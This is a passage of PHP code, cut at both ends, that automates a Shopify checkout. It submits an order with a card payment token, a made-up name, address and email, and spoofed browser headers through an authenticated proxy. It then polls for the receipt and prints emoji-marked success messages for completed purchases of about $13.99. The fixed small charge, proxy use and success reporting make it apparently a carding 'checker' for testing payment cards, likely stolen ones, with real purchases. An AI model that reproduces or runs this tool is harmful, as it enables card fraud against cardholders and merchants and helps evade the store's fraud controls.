                    'sessionToken' => $x_checkout_one_session_token
                ],
                'queueToken' => $queue_token,
                    'discounts' => [
                        'lines' => [],
                        'acceptUnexpectedDiscounts' => true
                    ],
                    'delivery' => [
                        'deliveryLines' => [
                            [
                                'destination' => [
                                    'streetAddress' => [
                                        'address1' => '4th Street Venue',
                                        'city' => 'New york',
                                        'countryCode' => 'US',
                                        'postalCode' => '10080',
                                        'firstName' => 'yashi Kumbi',
                                        'lastName' => 'Hasi',
                                        'zoneCode' => 'NY',
                                        'phone' => '',
                                        'oneTimeUse' => false
                                    ]
                                ],
                                'selectedDeliveryStrategy' => [
                                    'deliveryStrategyByHandle' => [
                                        'handle' => 'eedd39a6a58d3e7832641de01fda4ff4-76541393eff3a16bf34c87eae9303e6b',
                                        'customDeliveryRate' => false
                                    ],
                                    'options' => new stdClass()
                                ],
                                'targetMerchandiseLines' => [
                                    'lines' => [
                                        [
                                            'stableId' => $stable_id,
                                        ]
                                    ]
                                ],
                                'deliveryMethodTypes' => [
                                    'SHIPPING'
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => '5.99',
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'destinationChanged' => false
                            ]
                        ],
                        'noDeliveryRequired' => [],
                        'useProgressiveRates' => false,
                        'prefetchShippingRatesStrategy' => null,
                        'supportsSplitShipping' => true
                    ],
                    'deliveryExpectations' => [
                        'deliveryExpectationLines' => [
                            [
                                'signedHandle' => 'GacEWlcKhzf/glwqOAIWJ1+8Wm7FEdoFHkF8WqQPDvS9/a1zBmB9wSpJuYjAQuTixYpWBIQFhaIW4LIP7dScdjbKAg9QfOrm6QZZd6t+bCYiMHwXQp3F+1em4B9os3WUJGWpqE8MhzbRWuq0UPB8pORIM9gzkdsLk1h5iCMbVjDQi/psTk8kmVfDSUPPpbduYZLbq282fUhtsofq4MckjCqUAk9fMruZfdobG1ZPe4G3I9/yxHd4fZkag1J7tSAU3cdsF4rwqFFcEOn1pIRj33sh/g+hXlZrqVK4uKX2LAhcjZOS91JX2weBb0B6vIlzwuDKTLAF2Umx7Q2xZ7TOq7rf6IPmp6Wcbwq8sECanI4sf25/0f0PF+F94qZvbTQ09DIwtYjkgY+c60u/BNDIuGX2K2ebQSDGKDXjK6gY6ZIWebCdCwp5fedjUlFfaFyK0uL7B60+O7/XMppv2L+o/LBkKgAzsfMDBKmyFXA/UFVUMn333FX/hxQ7YQs6SfYKb4Lb819BfI/tUveD9sFJEMl4ve+jvVAyFe93BFziRSNkH9ugsBYDm9ESl9urjCNI9Ke2WtLvshvAIkbCyV+sDY5jiyimODd4Ehfc3wk0lhccboObo0/wQwJzlhFYwAOty485HvfBZkt+wdUmS1lGnIHK5rHRciJL/R3Mu09/cSXhUa022VesaPvZlHE/Ziefk8FehvqDee4vX7W1FaevTlnvm/kgTohJuQI19DOYod0t3fxvzf+saVgyiKoFTtq26GzqAPxwA0nlIgUwWxcxIyLHOC8NrMQmJbpDBBpMJum9/HMRqntowseGEh+brgU9MHOr/lRdsmuF3hUsXfOZGMj4u3bOHhfRPTQAkrHHd7eS6DzVszTm5MnlWzpaludw+0fTLz+CcmxGCnOCh1TSVLbcGCHECFCg5OqhR+Js68Hh3vj/etlrFmKHCGMPh2j/7UdRs1D1AQYQPwWqNPoyVCituyDKv427znDzqfym2lRqvWIG6vsgiosIBJXJRmb6fI7gJZTsnZm10XBuuUe6DlrZjRl0kgmDq3vp4Hyuc6o6zzV+JQeuo3emQq7fla1j+9T2AC0XpoRRk4ApAcblXNQKP9+UDreOwHWve78UZ4yzFcNYN4EM91X/a814N/mMpaZjdHmm8uDk7RxaivxjZRKNTJX+mdwH2QARmt2/k+KHP7571GgOc0wWP7/3L9tpO4mkR17afdHxTVzVjsPn/sqtljDbKzhb/BFA8fW0Pmd+FmJliNjT+To5ddi6WodxzfRKUa9KY1GcVDkEiSsl5LVn5uKFrpbsnvuVYAiu161P9P4gg4R8jCX276t4XfVFaR195576qrCKftyfn5sDzvTK2nIJiBWnXRvl7imQd5QnqeUzdWcnBe/nMxyliXr1MT74l+jEyamfLb2wEa+L5OudaQWt5EuI3cNSQafaAk3pHdG8pa7pCsmqZnrAV1jCAzi6Y3vL+t9Q6gMRLr2xkeN4MlhwjRJIBxR8Ly/azd6aK52iu7ErzaGCivdzXYXnB6FLKmEojZYXIIhu6vTBMItIsHNi+VNoibE0LV0NvTlfycp7h2lb2MX4eqErdsTMU7jO7wpeEJ5H5RIkMyrmSAiodMXmdQI=--SkkrHixcsemwqKcK--OsX5GEsQP1WqMrLWSEcQ3A=='
                            ],
                            [
                                'signedHandle' => 'xU157sLscZRdrBMIbEHwZ+sqxBhOmtSc+c1phTVFwtmoTABl7tqs3oleK1/k/N4CtJ7tk896hKkgx2gUTpC8hpZ/N9D+o1tZ4jVjFSprIyCoZ+VE5BvFzTJrolBAuNRnqZbRqYcdF5PmSVMhcjCiAuDb5chk68c9+0SGAvyKXAjqs7O03HLkz4kZYHzEthCEOuach14x5wOk/HRRdnnU04lRBOzf/Zygn0rTS1Cmvg3Quz4aZhqkhYJM36iIQbBH+YfUAk59ILy0eRCsiziIgYxiB9pdYV2ARi9vFhz6UyKe46haBKGPxheBukmirbDME4S8kuXmgqodMg1uR2ZQt6Ay7KWdxHxQ8FoGhwyeR6XLgjW0iAmnSoHs5pH1C1hGmzWbgHSjXVamv6x37xR/qncyzf9aV9lL3ozOS/kiFk/Tk0wUT/B7tUPYnhtwtFQwhgTsJJeV2GobKBkH/aOR4fC3b7BGf/nxJzHLLD88/RiOu4tjLRczMFSRdUneyJBzDPvOgRvIi1H8nrU3TxR8K+wYMZjyj762GzFC9jvupo+gKcnQEG0rZLE7wq5nMENAJBoNhMqypxbODM0uXYQKUlx8igeLEQeqZ6giv0zoliCmK8jsaBTS7u5noTmsip7h+92EkPWS5ay1ukdHMI0Qu3klD9h3JmwP5Ek6ID6jPZKt1CyuyHrdq4x47wbzLdVqcK+zfRfUE7GK9p9Dcnm8VznV2KRfnqsHVJ3e29iuWWIKMppm/k/ss4yoEuJURJiwIxSviFYyVGOYXnmTHxGXha/87jT/dfVMxcnkx4KjUuMPPFre5bP6pM8yLB/tol4kgNY3T2eeaTn2epLhG7Zmm3JiWAO9RsmFq02Z/XG+8HqpMZ/hvy+TIjMmlybEo61DR0R48lKULj4ahsu++912kJhK1nGpI2WUqebXaD9ZQ5VF1Rdfh+kHJRr76Qnkt0/cteLHyaruexxE1nPoQiWx+TT1aqQz2glB/MsyFCyHspjnN98n79vSXn1rWPS2GFVOqQv77+BTlu49ve4GHPrXCvucy0mZBWn6FC+oM0A18pSpLRnxGz2kTISrAp60QN4LE8s2/Nf8MMFckHXX6odfIiDvmmWUBJcEBJthsJck3BUClFW/drvM7eawYQLbMDGrScinf85FgfODeMeONRWRTzTY7xDSZt3eyjIxPpwG/mxMmJVkzzN7SkPFITXcN6wYAsDWDFi2oFgnFV3d5AKFd9jhCVKl8Xi7otkceA4ChEfUUSxoH0FBGNs+10jOFCkJgzm+WlB+oB+Ew6XGw8+YF6/XCxBTZoTvKa8GqjaP2Me6btCFxoKZ3t7hCpSKgEYWZTPicy3v8bZEJB4i5KlDzxSqf+Ss2Yjyv0PmMgCYY8HdT3kvH6RXXPbwqaiqS+86i5fRkVvyteF11NK/Ys6VRZUyEU4UCvVbz4c/7RtXXt4EP9l4XQ=--IkdNXNLePMwO89aF--0jxFNB0mMrhuwnj86Grk8g=='
                            ]
                        ]
                    ],
                    'merchandise' => [
                        'merchandiseLines' => [
                            [
                                'stableId' => $stable_id,
                                'merchandise' => [
                                    'productVariantReference' => [
                                        'id' => 'gid://shopify/ProductVariantMerchandise/42721297924198',
                                        'variantId' => 'gid://shopify/ProductVariant/42721297924198',
                                        'properties' => [],
                                        'sellingPlanId' => null,
                                        'sellingPlanDigest' => null
                                    ]
                                ],
                                'quantity' => [
                                    'items' => [
                                        'value' => 1
                                    ]
                                ],
                                'expectedTotalPrice' => [
                                    'value' => [
                                        'amount' => '7.99',
                                        'currencyCode' => 'USD'
                                    ]
                                ],
                                'lineComponentsSource' => null,
                                'lineComponents' => []
                            ]
                        ]
                    ],
                    'memberships' => [
                        'memberships' => []
                    ],
                    'payment' => [
                        'totalAmount' => [
                            'any' => true
                        ],
                        'paymentLines' => [
                            [
                                'paymentMethod' => [
                                    'directPaymentMethod' => [
                                        'paymentMethodIdentifier' => $paymentMethodIdentifier,
                                    'sessionId' => $cctoken,
                                        'billingAddress' => [
                                            'streetAddress' => [
                                                'address1' => '4th Street Venue',
                                                'city' => 'New york',
                                                'countryCode' => 'US',
                                                'postalCode' => '10080',
                                                'firstName' => 'yashi Kumbi',
                                                'lastName' => 'Hasi',
                                                'zoneCode' => 'NY',
                                                'phone' => ''
                                            ]
                                        ],
                                        'cardSource' => null
                                    ],
                                    'giftCardPaymentMethod' => null,
                                    'redeemablePaymentMethod' => null,
                                    'walletPaymentMethod' => null,
                                    'walletsPlatformPaymentMethod' => null,
                                    'localPaymentMethod' => null,
                                    'paymentOnDeliveryMethod' => null,
                                    'paymentOnDeliveryMethod2' => null,
                                    'manualPaymentMethod' => null,
                                    'customPaymentMethod' => null,
                                    'offsitePaymentMethod' => null,
                                    'customOnsitePaymentMethod' => null,
                                    'deferredPaymentMethod' => null,
                                    'customerCreditCardPaymentMethod' => null,
                                    'paypalBillingAgreementPaymentMethod' => null
                                ],
                                'amount' => [
                                    'value' => [
                                        'amount' => '13.98',
                                        'currencyCode' => 'USD'
                                    ]
                                ]
                            ]
                        ],
                        'billingAddress' => [
                            'streetAddress' => [
                                'address1' => '4th Street Venue',
                                'city' => 'New york',
                                'countryCode' => 'US',
                                'postalCode' => '10080',
                                'firstName' => 'yashi Kumbi',
                                'lastName' => 'Hasi',
                                'zoneCode' => 'NY',
                                'phone' => ''
                            ]
                        ]
                    ],
                    'buyerIdentity' => [
                        'customer' => [
                            'presentmentCurrency' => 'USD',
                            'countryCode' => 'US'
                        ],
                        'email' => 'proxybroproxy@gmail.com',
                        'emailChanged' => false,
                        'phoneCountryCode' => 'US',
                        'marketingConsent' => [],
                        'shopPayOptInPhone' => [
                            'countryCode' => 'US'
                        ],
                        'rememberMe' => false
                    ],
                    'tip' => [
                        'tipLines' => []
                    ],
                    'taxes' => [
                        'proposedAllocations' => null,
                        'proposedTotalAmount' => [
                            'value' => [
                                'amount' => '0',
                                'currencyCode' => 'USD'
                            ]
                        ],
                        'proposedTotalIncludedAmount' => null,
                        'proposedMixedStateTotalAmount' => null,
                        'proposedExemptions' => []
                    ],
                    'note' => [
                        'message' => null,
                        'customAttributes' => []
                    ],
                    'localizationExtension' => [
                        'fields' => []
                    ],
                    'nonNegotiableTerms' => null,
                    'scriptFingerprint' => [
                        'signature' => null,
                        'signatureUuid' => null,
                        'lineItemScriptChanges' => [],
                        'paymentScriptChanges' => [],
                        'shippingScriptChanges' => []
                    ],
                    'optionalDuties' => [
                        'buyerRefusesDuties' => false
                    ],
                    'cartMetafields' => []
                ],
                'attemptToken' => ''.$checkoutToken.'8ix3lway4kj',
                'metafields' => [],
                'analytics' => [
                    'requestUrl' => $urlbase.'/checkouts/cn/'.$checkoutToken,
                    'pageId' => 'b2b0b81e-D05D-47C0-F64C-18D9467EA842'
                ]
            ],
            'operationName' => 'SubmitForCompletion'
        ]);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $postf);
        
        curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'].':'.$proxy['port']);
        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['username'].':'.$proxy['password']);
        curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);

        $response4 = curl_exec($ch);
        $http_code4 = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        
        $debug_info['step3_http_code'] = $http_code4;
        $debug_info['step3_response'] = $response4;

        $response4js = json_decode($response4);
        curl_close($ch);

        echo "<pre>🔍 Step 3 Response - HTTP: $http_code4</pre>";
        flush();

        // Enhanced receipt ID extraction with better error handling
        if (isset($response4js->data->submitForCompletion->receipt->id)) {
            $recipt_id = $response4js->data->submitForCompletion->receipt->id;
        } elseif (isset($response4js->data->submitForCompletion->__typename)) {
            $err = "Submit failed: " . $response4js->data->submitForCompletion->__typename;
            if (isset($response4js->data->submitForCompletion->reason)) {
                $err .= " - " . $response4js->data->submitForCompletion->reason;
            }
            throw new Exception($err);
        } elseif (isset($response4js->errors[0]->message)) {
            $err = "GraphQL Error: " . $response4js->errors[0]->message;
            throw new Exception($err);
        }

        if (empty($recipt_id)) {
            $err = 'Receipt id is empty - Check step 3 response for details';
            $debug_info['step3_parsed'] = $response4js;
            throw new Exception($err);
        }

        echo "<pre>✅ Step 3 Complete - Receipt ID: $recipt_id</pre>";
        flush();

        sleep(2);

        // Fourth request - Poll for receipt
        $postf2 = json_encode([
            'query' => 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments paymentExtensionBrand analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder payEscrowMayExist buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{splitShippingToggle deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{id brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}parentRelationship{parent{stableId lineAllocations{stableId __typename}__typename}__typename}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}subtotalAfterMerchandiseDiscounts{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText url one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}',
            'variables' => [
                'receiptId' => $recipt_id,
                'sessionToken' => $x_checkout_one_session_token
            ],
            'operationName' => 'PollForReceipt'
        ]);

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $urlbase.'/checkouts/unstable/graphql?operationName=PollForReceipt');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
        curl_setopt($ch, CURLOPT_HTTPHEADER, [
            'accept: application/json',
            'accept-language: en-US',
            'content-type: application/json',
            'origin: '.$urlbase,
            'priority: u=1, i',
            'referer: '.$urlbase,
            'sec-ch-ua: "Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile: ?0',
            'sec-ch-ua-platform: "Windows"',
            'sec-fetch-dest: empty',
            'sec-fetch-mode: cors',
            'sec-fetch-site: same-origin',
            'user-agent: '.$ua,
            'x-checkout-one-session-token: ' . $x_checkout_one_session_token,
            'x-checkout-web-build-id: 63e3454a054ed16691c8d7d3dfaf57981df0b7df',
            'x-checkout-web-deploy-stage: production',
            'x-checkout-web-server-handling: fast',
            'x-checkout-web-server-rendering: no',
            'x-checkout-web-source-id: ' . $checkoutToken,
        ]);

        curl_setopt($ch, CURLOPT_POSTFIELDS, $postf2);

        $start = microtime(true); // ▶️ Start timing

        $response5 = curl_exec($ch);
        $http_code5 = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        $end = microtime(true); // ▶️ End timing
        $time_taken = number_format($end - $start, 2);

        $debug_info['step4_http_code'] = $http_code5;
        $debug_info['step4_response'] = $response5;

        curl_close($ch);

        $r5js = json_decode($response5);

        echo "<pre>✅ Step 4 Complete - Final Response Received</pre>";
        flush();

        // Enhanced response parsing
        if (str_contains($response5, $checkouturl . '/thank_you')) {
            $err = '🔥Thank you for your purchase! -> $13.99';
        } elseif (str_contains($response5, $checkouturl . '/post_purchase')) {
            $err = '🔥Thank you for your purchase! -> $13.99'; 
        } elseif (str_contains($response5, 'Your order is confirmed')) {
            $err = '🔥Your Order Has Been Placed! ->> $13.98';
